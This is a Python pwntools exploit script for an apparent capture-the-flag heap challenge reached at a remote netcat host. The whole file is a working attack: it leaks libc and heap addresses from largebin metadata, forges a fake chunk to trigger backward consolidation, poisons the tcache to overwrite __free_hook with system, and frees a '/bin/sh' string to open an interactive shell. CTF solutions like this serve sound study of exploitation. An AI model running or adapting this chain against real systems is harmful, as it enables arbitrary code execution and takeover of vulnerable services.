#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc mc.ax 32526"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def do_str(size: int, data: bytes) -> int:
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size? ", str(size).encode())
    io.sendafter(b"str? ", data)
    io.recvuntil(b"stored at ")
    return int(io.recv(1))


def do_tok(idx: int, delim: bytes):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"idx? ", str(idx).encode())
    io.sendlineafter(b"delim? ", delim)


def do_del(idx: int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"idx? ", str(idx).encode())


env = {}
io = start()

a = do_str(0xc00, b"1")
pad = do_str(0x10, b"pad")

do_del(a)  # goes into unsortedbins

"""
1. scan unsortedbins
2. no free chunk match exactly the requested size and no last remainder
3. unsortedbins are sorted and `a` goes into largebins
    - now `a` has fd, bk, fdnextsize, and bknextsize
    - fd and bk have libc addresses
    - fdnextsize and bknextsize have heap addresses
4. i guess the next to be searched is largebins and found `a`
5. finally `a` is remaindered
"""
delim = b";"
a = do_str(0x100, b"a" * 0x7 + delim)
do_tok(a, delim)  # leak bk field

io.recvline()
libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
# log.info(f"{libc_leak=:#x}")
libc.address = libc_leak - libc.sym["main_arena"] - 0x650
log.info(f"{libc.address=:#x}")

do_del(a)
a = do_str(0x100, b"a" * 0xf + delim)
do_tok(a, delim)  # leak fdnextsize

io.recvline()
heap_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"{heap_leak=:#x}")

do_del(a)

fake_size = 0x190
# fake_chunk is @ heap_leak+0x10
fake_chunk = flat(
    0, fake_size | 1,
    heap_leak + 0x10, heap_leak + 0x10,  # make it points to itself
)
a = do_str(0x108, fake_chunk)
b = do_str(0x88, b"a" * 0x88)
victim = do_str(0x4f0, b"a")
do_tok(b, b"\x01")  # clear victim prev_inuse bit
do_del(b)
b = do_str(0x88, b"a" * 0x80 + p64(fake_size))  # set victim prev_size
do_del(victim)  # backward consolidation


addr = libc.sym["__free_hook"] - 8
data = flat(0, libc.sym["system"])
c = do_str(0x38, b"a")
d = do_str(0x38, b"a")
do_del(d)
do_del(c)
do_del(a)
a = do_str(0x108, flat(0, 0x41, addr))
c = do_str(0x38, b"a")
d = do_str(0x38, data)

e = do_str(0x50, b"/bin/sh\x00")
do_del(e)

io.interactive()
